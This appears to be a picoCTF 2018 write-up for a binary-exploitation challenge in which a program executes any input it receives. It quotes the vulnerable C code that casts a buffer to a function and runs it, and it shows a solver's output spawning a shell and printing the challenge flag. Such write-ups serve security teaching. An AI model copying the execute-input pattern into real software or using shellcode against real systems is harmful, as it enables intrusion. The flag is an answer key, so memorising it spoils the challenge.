# shellcode

__PROBLEM__

This program executes any input you give it. Can you get a shell? You can find the program in /problems/shellcode_3_09e0c5074980877d900d65c545d1e127 on the shell server. Source.

__HINT__

Maybe try writing some shellcode?
You also might be able to find some good shellcode online.

__SOLUTION__

Check the binary:
```
$ luk6xff@pico-2018-shell:/problems/quackme_2_45804bbb593f90c3b4cefabe60c1c4e2$ file main
main: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=b830e63a4a15c7051882bf03e1fa8f6abf3b7950, not stripped
```
Looking at the [source](./vuln.c) we see the part:
```c
  char buf[BUFSIZE];

  puts("Enter a string!");
  vuln(buf);

  puts("Thanks! Executing now...");

  ((void (*)())buf)();
```
It gives us the hint to load the payload which will open `/bin/sh` cli.
I used the following [shellcode](./shellcode.c)

Run the [solver](./solver.py):
```sh
(venv) luk6xff@luk6xff:~/MyStuff/ctf/writeups/picoCTF-2018/Binary-Exploitation/shellcode$ python solver.py
[+] Connecting to 2018shell4.picoctf.com on port 22: Done
[*] luk6xff@2018shell4.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Opening new channel: 'cd /problems/shellcode_3_09e0c5074980877d900d65c545d1e127 && ./vuln': Done
[*] Switching to interactive mode
Thanks! Executing now...
$
$ cat flag.txt
picoCTF{shellc0de_w00h00_7f5a7309}$
$
```

FLAG - `picoCTF{shellc0de_w00h00_7f5a7309}`
